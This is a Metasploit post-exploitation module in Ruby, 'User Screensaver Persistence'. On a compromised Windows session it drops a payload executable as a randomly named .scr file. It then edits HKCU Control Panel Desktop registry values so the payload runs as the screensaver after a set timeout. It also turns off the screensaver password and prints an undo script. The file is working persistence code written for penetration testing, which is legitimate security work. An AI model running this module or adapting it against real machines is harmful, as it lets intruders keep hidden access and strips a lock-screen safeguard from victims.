##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/file'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Windows::Registry
  include Msf::Post::File
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'User Screensaver Persistence',
      'Description'    => %q{
        This module will install a payload as the screensaver for a
        user by creating the setting in the registry to execute a
        specific screensaver executable.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'h00die',
        ],
      'Platform'       => [ 'win' ],
      'SessionTypes'   => [ 'meterpreter', 'shell' ],
      'Targets'        =>
        [
          [ 'Automatic', { } ]
        ],
      'References'     =>
        [
          ['URL', 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1180/T1180.md'],
          ['URL', 'https://attack.mitre.org/techniques/T1180/'],
          ['URL', 'https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf']
        ],
      'DisclosureDate' => "Aug 7 2017",
    ))

    register_options([
      OptString.new('WritableDir', [ true, 'A directory where we can write files', 'C:\\ProgramData\\' ]),
      OptInt.new('SCREENSAVERTIMEOUT', [ true, 'Seconds till screensaver becomes active', 60 ])
    ])
  end

  def exploit
    reg_root = 'HKEY_CURRENT_USER\Control Panel\Desktop'

    undo_script = []

    # check pre-altered values and create an undo script
    keys = registry_enumvals(reg_root)
    ['SCRNSAVE.EXE', 'ScreenSaveActive', 'ScreenSaverTimeout', 'ScreenSaverIsSecure'].each do |value|
      if keys.include?(value)
        data = registry_getvaldata(reg_root, value)
        undo_script << "reg.exe add \"#{reg_root}\" /v #{value} /t REG_SZ /d #{data} /f"
        print_status("Original #{value} value: #{data}")
      else
        undo_script << "reg.exe delete \"#{reg_root}\" /v #{value} /f"
      end
    end
    print_good("Script to revert changes:\n#{undo_script.join("\n")}")

    # upload file
    payload = "#{datastore['WritableDir']}#{rand_text_alphanumeric 5..10}.scr"
    print_status("Writing payload to #{payload}")
    write_file(payload, generate_payload_exe)

    # set registry
    print_status('Changing screensaver')
    registry_setvaldata(reg_root, 'ScreenSaveActive', '1', 'REG_SZ') # enable screensaver
    registry_setvaldata(reg_root, 'ScreenSaverTimeout', datastore['SCREENSAVERTIMEOUT'].to_s, 'REG_SZ') # wait time till screensaver acrivated
    registry_setvaldata(reg_root, 'ScreenSaverIsSecure', '0', 'REG_SZ') # disable password to unlock screensaver
    registry_setvaldata(reg_root, 'SCRNSAVE.EXE', payload, 'REG_SZ') # binary payload

    print_good('Screensaver set!')
  end
end
